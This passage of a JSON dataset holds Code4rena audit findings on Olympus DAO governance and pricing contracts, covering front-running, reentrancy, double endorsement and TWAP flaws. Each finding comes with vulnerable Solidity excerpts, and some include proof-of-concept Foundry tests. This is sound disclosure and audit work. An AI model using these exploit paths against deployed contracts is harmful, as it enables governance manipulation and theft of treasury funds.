corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, issueVotesTo and revokeVotesFrom can be disabled when an active proposal exists.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/275",
      "tags": [],
      "finders": [
        "csanuragjain",
        "__141345__",
        "rbserver",
        "Guardian",
        "cccz",
        "GalloDaSballo",
        "Lambda",
        "m9800",
        "zzzitron"
      ]
    },
    {
      "id": "3213",
      "title": "[M-09] `activateProposal()` need time delay",
      "impact": "MEDIUM",
      "content": "_Submitted by &#95;&#95;141345&#95;&#95;, also found by 0x1f8b, Trust, V&#95;B, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205-L262><br>\n\nThere is no time lock or delay when activating a proposal, the previous one could be replaced immediately. In `vote()` call, a user might want to vote for the previous proposal, but if the `vote()` call and the `activateProposal()` is very close or even in the same block, it is quite possible that the user actually voted for another proposal without much knowledge of. A worse case is some malicious user watching the mempool, and front run a big vote favor/against the `activeProposal`, effectively influence the voting result.\n\nThese situations are not what the governance intends to deliver, and might also affect the results of 2 proposals.\n\n### Proof of Concept\n\n`activateProposal()` can take effect right away, replacing the `activeProposal`. And `vote()` does not specify which `proposalId` to vote for, but the `activeProposal` could be different from last second.\n\nsrc/policies/Governance.sol\n\n```solidity\n    function activateProposal(uint256 proposalId_) external {\n        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];\n\n        if (msg.sender != proposal.submitter) {\n            revert NotAuthorizedToActivateProposal();\n        }\n\n        if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {\n            revert SubmittedProposalHasExpired();\n        }\n\n        if (\n            (totalEndorsementsForProposal[proposalId_] * 100) <\n            VOTES.totalSupply() * ENDORSEMENT_THRESHOLD\n        ) {\n            revert NotEnoughEndorsementsToActivateProposal();\n        }\n\n        if (proposalHasBeenActivated[proposalId_] == true) {\n            revert ProposalAlreadyActivated();\n        }\n\n        if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {\n            revert ActiveProposalNotExpired();\n        }\n\n        activeProposal = ActivatedProposal(proposalId_, block.timestamp);\n\n        proposalHasBeenActivated[proposalId_] = true;\n\n        emit ProposalActivated(proposalId_, block.timestamp);\n    }\n\n    function vote(bool for_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (activeProposal.proposalId == 0) {\n            revert NoActiveProposalDetected();\n        }\n\n        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\n            revert UserAlreadyVoted();\n        }\n\n        if (for_) {\n            yesVotesForProposal[activeProposal.proposalId] += userVotes;\n        } else {\n            noVotesForProposal[activeProposal.proposalId] += userVotes;\n        }\n\n        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;\n\n        VOTES.transferFrom(msg.sender, address(this), userVotes);\n\n        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);\n    }\n\n```\n\n### Recommended Mitigation Steps\n\nAdd time delay when activating a proposal, so that users can be aware of that and vote for the current one within the time window.\n\n**[fullyallocated (Olympus) disputed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/273#issuecomment-1234872386):**\n > This is a pretty unique edge case, I can acknowledge as QA.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/273#issuecomment-1249571276):**\n > I actually don't think its that unique in the case of on chain voting. Imagine a scenario where a user submits a vote with low gas amounts and it is not mined for days later and then the active proposal has changed.  I am not sure why the `vote` function wouldn't take in the intended proposal ID. \n> \n> I am going to leave as medium severity as I do think this impacts the intended functionality of the protocol, but am willing to hear more from the sponsor on why they disagree.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the 'Governance.sol' code of the '2022-08-olympus' project on Github. The vulnerability is that there is no time delay when activating a proposal, meaning the previous one could be replaced immediately. This could lead to a situation where a user might want to vote for the previous proposal, but if the vote call and the activateProposal call are very close or even in the same block, it is quite possible that the user actually voted for another proposal without much knowledge of. A malicious user could even front run a big vote, influencing the voting result. Manual analysis was used to detect this vulnerability. The recommended mitigation step is to add a time delay when activating a proposal, so that users can be aware of that and vote for the current one within the time window.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/273",
      "tags": [
        "Vote"
      ],
      "finders": [
        "Trust",
        "__141345__",
        "zzzitron",
        "0x1f8b",
        "V_B"
      ]
    },
    {
      "id": "3212",
      "title": "[M-08] \"TWAP\" used is an observation-weighted-average-price, not a time-weighted one",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI_\n\nWhile users are incentivized to call the heartbeat, the incentive may be removed later, or it may be more profitable to use old prices, so users may not call the heartbeat during unfavorable prices, leading to the TWAP price being incorrect, and users getting the wrong price for their assets.\n\nA similar case of an incomplete TWAP algorithm was found to be of [Medium](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191) risk.\n\n### Proof of Concept\n\nA TWAP is a Time-Weighted average price, but the algorithm below does not take into account the time between observations:\n\n```solidity\nFile: /src/modules/PRICE.sol   #1\n\n134          // Calculate new moving average\n135          if (currentPrice > earliestPrice) {\n136              _movingAverage += (currentPrice - earliestPrice) / numObs;\n137          } else {\n138              _movingAverage -= (earliestPrice - currentPrice) / numObs;\n139          }\n140  \n141          // Push new observation into storage and store timestamp taken at\n142          observations[nextObsIndex] = currentPrice;\n143          lastObservationTime = uint48(block.timestamp);\n144:         nextObsIndex = (nextObsIndex + 1) % numObs;\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L134-L144>\n\nWhile the `Heart` policy enforces an upper bound on how frequently updates are added to the average, there is no guarantee that users call `beat()` in a timely manner:\n\n```solidity\nFile: /src/policies/Heart.sol   #2\n\n92       function beat() external nonReentrant {\n93           if (!active) revert Heart_BeatStopped();\n94:          if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L94>\n\nThe incentive may be set to too low an amount:\n\n```solidity\nFile: /src/policies/Heart.sol   #3\n\n140      function setRewardTokenAndAmount(ERC20 token_, uint256 reward_)\n141          external\n142          onlyRole(\"heart_admin\")\n143      {\n144          rewardToken = token_;\n145          reward = reward_;\n146          emit RewardUpdated(token_, reward_);\n147:     }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L140-L147>\n\nOr users may find it more profitable to skip a particular update, or front-run an unfavorable update, with a transaction that trades assets at the old price\n\n### Recommended Mitigation Steps\n\nAlways call an internal version of `beat()` that doesn't revert, in functions that swap user assets. The code should also track the timestamps of when each `beat()` is called, and include the amount of time that has passed since the last beat, in the TWAP calculation\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1241043919):**\n > The referenced issue is a bit different than our use case since we will be using a much longer duration moving average. The goal is to get an approximate moving average over a certain period of time (e.g. 120 days) vs. an exact number since, as you say, the time of each observation cannot be guaranteed to be at a specific time. We believe that using a long duration with a sufficient number of observations will make this value close enough to the true value it is approximating, and prevents actors from manipulating the value by waiting to provide a specific value (1 out of ~360 obs doesn't move the needle). The use of the \"TWAP\" term may be semantically inaccurate.\n> \n> As for not guaranteeing that the update will be called or issues with several observations close to each other, see comments on [#405](https://github.com/code-423n4/2022-08-olympus-findings/issues/405) and [#79](https://github.com/code-423n4/2022-08-olympus-findings/issues/79).\n> \n> The mitigations suggested do not seem to provide a solution that improves the system. Calling `beat()` on user actions would not have the observations roughly evenly spaced. Tracking timestamps is possible, but I don't see how it improves the data.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1251044977):**\n > @Oighty - I think the warden is suggesting that the call to beat() in the user actions would do more to ensure that the \"TWAP\" stays up to date.  If the call isn't past the correct period, it would just return and make no change (costing some amount of gas, ofc).\n> \n> I do think it may be worth considering, that way no user action can take place without the TWAP being as up to date as possible and no additional calls to the contract may be necessary if users are interacting with the contract frequently enough. \n> \n> While this is related to [#79](https://github.com/code-423n4/2022-08-olympus-findings/issues/79) - I think the points raised here and the mitigation is sufficiently different to warrant this issue to stand alone.  \n\n**[Oighty (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1255235303):**\n > That's a fair point. One issue with calling `beat` on user actions, e.g. `Operator.swap`, is that it would update the wall price that the user is swapping at. Therefore, the call could fail due to the slippage check. This could be confusing behavior and may have unintended consequences of DOS'ing the system. Additionally, the gas cost of `beat` is highly variable (sometimes up to 600k gas when opening a bond market) and would cause some users to unexpectedly pay a lot more gas for a swap.\n> \n> I'll discuss with the team, but I don't think the pros exceed the cons.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the PRICE.sol and Heart.sol smart contracts. The vulnerability is related to the Time-Weighted Average Price (TWAP) algorithm, which does not take into account the time between observations. This could lead to users getting the wrong price for their assets. The issue was found using code inspection and is of Medium risk. \n\nThe recommended mitigation steps are to always call an internal version of `beat()` that doesn't revert, in functions that swap user assets. Additionally, the code should track the timestamps of when each `beat()` is called, and include the amount of time that has passed since the last beat, in the TWAP calculation. This will ensure that users get the correct price for their assets.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/267",
      "tags": [
        "TWAP"
      ],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "3211",
      "title": "[M-07] Endorsed votes by a user do not decrease after the user's votes are revoked",
      "impact": "MEDIUM",
      "content": "_Submitted by rbserver_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>\n\nThe voter admin can call the following `revokeVotesFrom` function to revoke a user's votes, which also decreases the total supply of the votes, after the user endorses a proposal through calling the `endorseProposal` function below. Because `endorseProposal` can be called multiple times, the user has the incentive to call it for endorsing the proposal again with the new votes minted by the [`issueVotesTo`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48) function. However, after the user's votes are revoked, the user has no incentive to call `endorseProposal` again. Hence, the endorsed votes by the user for the proposal does not decrease after the user's votes are revoked. When determining whether the proposal can be activated or not, its old endorsed votes, which is not decreased, are compared against the new total supply of the votes, which is decreased because of the `revokeVotesFrom` call. As a result, the proposal is unreliably more likely to satisfy the condition for being activated.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56>\n\n```solidity\n    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n        // Revoke the votes in the VOTES module\n        VOTES.burnFrom(wallet_, amount_);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>\n\n```solidity\n    function endorseProposal(uint256 proposalId_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (proposalId_ == 0) {\n            revert CannotEndorseNullProposal();\n        }\n\n        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);\n        if (instructions.length == 0) {\n            revert CannotEndorseInvalidProposal();\n        }\n\n        // undo any previous endorsement the user made on these instructions\n        uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];\n        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;\n\n        // reapply user endorsements with most up-to-date votes\n        userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;\n        totalEndorsementsForProposal[proposalId_] += userVotes;\n\n        emit ProposalEndorsed(proposalId_, msg.sender, userVotes);\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in `src\\test\\policies\\Governance.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testScenario_EndorsedVotesDoNotDecreaseAfterVotesAreRevoked() public {\n        _submitProposal();\n\n        // voter3 endorse the proposal\n        vm.prank(voter3);\n        governance.endorseProposal(1);\n\n        assertEq(governance.userEndorsementsForProposal(1, voter3), 300);\n        assertEq(governance.totalEndorsementsForProposal(1), 300);\n\n        // to simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here\n        vm.prank(godmode);\n        VOTES.burnFrom(voter3, 300);\n\n        // at this moment, voter3 has 0 votes\n        assertEq(VOTES.balanceOf(voter3), 0);\n\n        // however, the proposal is still endorsed with voter3's previous votes\n        assertEq(governance.userEndorsementsForProposal(1, voter3), 300);\n        assertEq(governance.totalEndorsementsForProposal(1), 300);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen `revokeVotesFrom` is called during the time for endorsement, the corresponding votes that are previously endorsed for a proposal and are now revoked should be removed from the proposal's endorsed votes for the user. This ensures that the endorsed votes and the votes' total supply after the revocation are in sync for the proposal.\n\n**[fullyallocated (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/257#issuecomment-1235877095):**\n > This is true, and I appreciate the throughness of the explanation—it's hard to adjust endorsements based on the user's balance because there's no events/callbacks in solidity. We plan to use a staking vault where tokens are transfer locked and there's a warmup period + cooldown period to mitigate this issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the code of the 2022-08-olympus project, which is hosted on Github. The vulnerability is that when the voter admin calls the `revokeVotesFrom` function to revoke a user's votes, the total supply of the votes decreases, but the endorsed votes for the proposal do not decrease. This means that the proposal is more likely to satisfy the condition for being activated. The tools used to identify this vulnerability were VSCode.\n\nThe recommended mitigation steps for this vulnerability are to ensure that when `revokeVotesFrom` is called during the time for endorsement, the corresponding votes that are previously endorsed for a proposal and are now revoked should be removed from the proposal's endorsed votes for the user. This will ensure that the endorsed votes and the votes' total supply after the revocation are in sync for the proposal.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/257",
      "tags": [],
      "finders": [
        "rbserver"
      ]
    },
    {
      "id": "3210",
      "title": "[M-06] After endorsing a proposal, user can transfer votes to another user for endorsing the same proposal again",
      "impact": "MEDIUM",
      "content": "_Submitted by rbserver, also found by 0x1f8b, Bahurum, csanuragjain, and yixxas_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236>\n\nThe following comment indicates that the `OlympusVotes` contract is a stub for `gOHM`. Checking the `gOHM` contract at <https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code>, the `transfer` and `transferFrom` functions are available.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11>\n\n```solidity\n/// @notice Votes module is the ERC20 token that represents voting power in the network.\n/// @dev    This is currently a substitute module that stubs gOHM.\ncontract OlympusVotes is Module, ERC20 {\n```\n\nMoreover, the [documentation](https://hackmd.io/iWgqYLFwShGUDBF4zh397w#3-Vote-Redemption) states that the vote redemption mechanism \"exists to deter malicious behavior by ensuring users cannot transfer their voting tokens until after the proposal has been resolved\", which also indicates that the voting tokens are meant to be transferrable between users.\n\nWhen the voting tokens are transferrable, one user can first use her or his votes to call the following `endorseProposal` function to endorse a proposal and then transfer these votes to another user. The other user can use these votes to endorse the same proposal again afterwards. Because of the double-endorsement, the `(totalEndorsementsForProposal[proposalId_] * 100) < VOTES.totalSupply() * ENDORSEMENT_THRESHOLD` condition can become true so the proposal can be activated by calling the `activateProposal` function below. However, the proposal should only be endorsed with these same votes once and should not be able to be activated if it could not satisify `(totalEndorsementsForProposal[proposalId_] * 100) < VOTES.totalSupply() * ENDORSEMENT_THRESHOLD` with these votes being used once.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>\n\n```solidity\n    function endorseProposal(uint256 proposalId_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (proposalId_ == 0) {\n            revert CannotEndorseNullProposal();\n        }\n\n        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);\n        if (instructions.length == 0) {\n            revert CannotEndorseInvalidProposal();\n        }\n\n        // undo any previous endorsement the user made on these instructions\n        uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];\n        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;\n\n        // reapply user endorsements with most up-to-date votes\n        userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;\n        totalEndorsementsForProposal[proposalId_] += userVotes;\n\n        emit ProposalEndorsed(proposalId_, msg.sender, userVotes);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236>\n\n```solidity\n    function activateProposal(uint256 proposalId_) external {\n        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];\n\n        if (msg.sender != proposal.submitter) {\n            revert NotAuthorizedToActivateProposal();\n        }\n\n        if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {\n            revert SubmittedProposalHasExpired();\n        }\n\n        if (\n            (totalEndorsementsForProposal[proposalId_] * 100) <\n            VOTES.totalSupply() * ENDORSEMENT_THRESHOLD\n        ) {\n            revert NotEnoughEndorsementsToActivateProposal();\n        }\n\n        if (proposalHasBeenActivated[proposalId_] == true) {\n            revert ProposalAlreadyActivated();\n        }\n\n        if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {\n            revert ActiveProposalNotExpired();\n        }\n\n        activeProposal = ActivatedProposal(proposalId_, block.timestamp);\n\n        proposalHasBeenActivated[proposalId_] = true;\n\n        emit ProposalActivated(proposalId_, block.timestamp);\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in `src\\test\\policies\\Governance.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testScenario_UserEndorsesAfterReceivingTransferredVotes() public {\n        _submitProposal();\n\n        vm.prank(voter2);\n        governance.endorseProposal(1);\n\n        // to simulate calling gOHM's transfer function by voter2 for sending votes to voter0, VOTES.transferFrom is called by governance here\n        vm.prank(address(governance));\n        VOTES.transferFrom(voter2, voter0, 200);\n\n        // voter0 uses the votes previously owned by voter2 to endorse the proposal\n        vm.prank(voter0);\n        governance.endorseProposal(1);\n\n        // the proposal is endorsed with 400 votes but only the 200 votes originally owned by voter2 are used\n        assertEq(governance.userEndorsementsForProposal(1, voter0), 200);\n        assertEq(governance.userEndorsementsForProposal(1, voter2), 200);\n        assertEq(governance.totalEndorsementsForProposal(1), 400);\n\n        // At this moment, the proposal can be activated successfully.\n        // However, if it is endorsed with only 200 votes, it cannot satisfy ENDORSEMENT_THRESHOLD and cannot be activated.\n        vm.expectEmit(true, true, true, true);\n        emit ProposalActivated(1, block.timestamp);\n\n        vm.prank(voter1);\n        governance.activateProposal(1);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen calling `endorseProposal`, the user's votes can be locked by transferring these votes to the governance so the user cannot transfer these anymore to another user after the endorsement. An additional function can be added for reclaiming the endorsed votes back to the user and reducing the proposal's endorsed votes accordingly before the proposal is activated. After the proposal is activated, the endorsed votes should be counted as the voted votes.\n\n**[fullyallocated (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/239#issuecomment-1235877496):**\n > Taken from another issue:\n> \n> >This is true, and I appreciate the throughness of the explanation—it's hard to adjust endorsements based on the user's balance because there's no events/callbacks in solidity. We plan to use a staking vault where tokens are transfer locked and there's a warmup period + cooldown period to mitigate this issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `OlympusVotes` contract, which is a substitute module that stubs the `gOHM` contract. This vulnerability allows users to double-endorse a proposal, which can result in the proposal being activated even though it would not have been able to meet the endorsement threshold with the votes being used once.\n\nThe recommended mitigation steps are to lock the user's votes when they call the `endorseProposal` function by transferring these votes to the governance, and adding an additional function for reclaiming the endorsed votes back to the user and reducing the proposal's endorsed votes accordingly before the proposal is activated. After the proposal is activated, the endorsed votes should be counted as the voted votes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/239",
      "tags": [],
      "finders": [
        "csanuragjain",
        "Bahurum",
        "yixxas",
        "rbserver",
        "0x1f8b"
      ]
    },
    {
      "id": "3209",
      "title": "[M-05] Proposals overwrite",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x1f8b_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L66>\n\nIt is possible to overwrite proposals in certain circumstances. The method `Governance.submitProposal` doesn't check if the `proposalId` (stored in a different contract) exists already as a valid proposal in `getProposalMetadata`.\n\n### Proof of Concept\n\nIf the project update the kernel module \"`INSTR`\" and reconfigure proposals and call `INSTR.store(instructions_);`, the counter may return a `proposalId` of an existing proposal and overwrite an existing previous one.\n\nThis is due to the fact that the proposals are saved in a mapping of a contract that is not related to the one that returns the counters, and furthermore, they do not check that the record already exists.\n\n```javascript\n        uint256 proposalId = INSTR.store(instructions_);\n        getProposalMetadata[proposalId] = ProposalMetadata(\n            title_,\n            msg.sender,\n            block.timestamp,\n            proposalURI_\n        );\n```\n\n### Recommended Mitigation Steps\n\n*   Store the proposal metadata in the same `INSTR` contract or ensure that the proposal doesn't exist.\n\n**[fullyallocated (Olympus) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/201#issuecomment-1234818897):**\n > Agreed with the validity of the circumstance, but it is contingent on us upgrading the contract in an unexpected way. Is the same as saying \"if you upgrade a contract incorrectly it can break the dependencies\". \n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/201#issuecomment-1249566680):**\n > Going to downgrade to medium based on some external requirements needing to be in place to be realized. \n> \n> `\n> Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> Function of the protocol could be impacted and there are external requirements. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the code of a project called \"2022-08-olympus\". It is possible to overwrite proposals in certain circumstances due to the fact that the proposals are saved in a mapping of a contract that is not related to the one that returns the counters, and furthermore, they do not check that the record already exists.\n\nThe bug can be exploited by updating the kernel module \"`INSTR`\" and reconfiguring proposals and calling `INSTR.store(instructions_);`. This will cause the counter to return a `proposalId` of an existing proposal and overwrite an existing previous one.\n\nThe recommended mitigation step is to store the proposal metadata in the same `INSTR` contract or ensure that the proposal doesn't exists.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/201",
      "tags": [],
      "finders": [
        "0x1f8b"
      ]
    },
    {
      "id": "3208",
      "title": "[M-04] `OlympusGovernance#executeProposal`: reentrancy attack vulnerable function",
      "impact": "MEDIUM",
      "content": "_Submitted by carlitox477, also found by cryptphi and ladboy233_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L288>\n\nGiven that the activeProposal change is done before the for loop, if this function is call through one `kernel.executeAction(instruction,target)` we can call the same instructions (in the same order) again and again, which may or may not affect funds (depending on the instructions).\n\n### Proof of Concept\n\nFor instance, if we install a new module, and this module has a vulnerability (even intentional), the next steps can by trigger:\n\n1.  Call executeAction\n2.  This allow us to call kernel.executeAction in the for loop\n3.  executAction allow us to call **\\_installModule**\n4.  **\\_installModule** allow us to call **newModule\\_.Init**\n5.  By init we can call now executeProposal again (suppose that the init function interact with a previous vulnerable proxy contract to scam voters to vote in favour of this proposal as if it was a contract which is ok, and before calling executeProposal we change the implementation to allow this attack),\n\n### Recommended Mitigation Steps\n\nUse nonReentrant modifier or move the line `activeProposal = ActivatedProposal(0, 0);` before the for loop.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/132#issuecomment-1236240839):**\n > I don't know if funds are going to be threatened, but this does allow for a re-entrancy. Warden is correct in resetting the active Proposal before the for loop based on the checks-effects-interactions code design pattern.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project hosted on GitHub. The lines of code affected are 265 and 278 to 288. The vulnerability could allow an attacker to call the same instructions multiple times, potentially affecting funds. The proof of concept provided in the report is an example of how an attacker could use the vulnerability to install a vulnerable module and then exploit it. The vulnerability was discovered through static analysis. The recommended mitigation steps are to use a nonReentrant modifier or to move the line of code before the for loop.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/132",
      "tags": [],
      "finders": [
        "cryptphi  ladboy233",
        "carlitox477"
      ]
    },
    {
      "id": "3207",
      "title": "[M-03] RBS may redeploy funds automatically if price stays above or below wall for longer than `_config.regenWait`",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x52_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L195-L268><br>\n\nLoss of treasury funds.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L133-L139>\n\n    if (capacity_ < _range.high.threshold && _range.high.active) {\n        // Set wall to inactive\n        _range.high.active = false;\n        _range.high.lastActive = uint48(block.timestamp);\n\n\n        emit WallDown(true, block.timestamp, capacity_);\n    }\n\n\\_range.high.lastActive and \\_range.low\\.lastActive are only updated in RANGE.sol when \\_range.x.capacity < \\_range.x.threshold and the \\_range.x.active == true. After this is tripped, \\_range.x.active will be set to false, meaning that \\_range.x.lastActive will not be updated again until the wall is regenerated and capacity is restored.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L209-L214>\n\n        if (\n            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\n            _status.high.count >= config_.regenThreshold\n        ) {\n            _regenerate(true);\n        }\n\nIf 1) the price were to sustain outside of the range (high volatility for volatile asset, black swan for stable) for longer than config\\_.regenWait and 2) config_regenThreshold satisfies the following equation:\n\n    config_.regenThreshold <= _config.regenObserve - config_.regenWait / frequency\n\nthen *status.high.count could be greater than config*.regenThreshold. This would trigger more funds to be deployed even though the price never came back inside the wall price.\n\nIn this scenario the wall price would be far from the true price of the asset leading to loss of treasury funds as it buys/sell at prices well above/below market price.\n\n### Recommended Mitigation Steps\n\nA check should be added to verify that the price is within the wall price before regenerating. Alternatively, config\\_.regenTheshold could be set to satisfy the following equation:\n\n    config_.regenThreshold > _config.regenObserve - config_.regenWait / frequency\n\nThis would eliminate the risk as \\_status.high.count >= config\\_.regenThreshold could never be true for a sustained period where current price is greater than the wall price.\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/118#issuecomment-1235838436):**\n > This is valid. Our intended parameterization of the system would not be subject to this vulnerability, but it would be an issue if the system was incorrectly parameterized. Because it is an edge case, I'm not sure it is a high risk bug though.\n>\n > Another potential fix is resetting the `count` to 0 and the `observations` array to `new bool[](regenObserve)` to clear out positive values from when a wall goes down. This could be done in the `_updateCapacity()` function by checking if the new capacity is under the threshold.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/118#issuecomment-1252356234):**\n > Going to downgrade to Medium as the external dependency is a configuration that is not planned to be used by the sponsor. \n\n\n\n***\n\n",
